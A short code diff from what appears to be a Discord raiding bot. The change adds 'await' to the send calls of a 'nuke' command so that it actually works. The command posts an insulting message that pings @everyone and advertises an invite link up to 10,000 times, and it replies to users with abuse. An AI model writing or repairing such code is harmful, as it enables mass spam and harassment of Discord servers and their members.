@@ -363,11 +363,11 @@ async def nuke_command(message: discord.Message):
         try:
             times = int(args[1])
         except:
-            message.channel.send("pass a valid number dumbass")
+            await message.channel.send("pass a valid number dumbass")
             return
     else:
         times = 10000
     
     for i in range(times):
-        message.channel.send("GET NUKED MOFO BIG L OWNED BY GUEST AND RETTI | @everyone @everyone JOIN NOW https://discord.gg/R7G3ECwmVe")
+        await message.channel.send("GET NUKED MOFO BIG L OWNED BY GUEST AND RETTI | @everyone @everyone JOIN NOW https://discord.gg/R7G3ECwmVe")
         time.sleep(2)
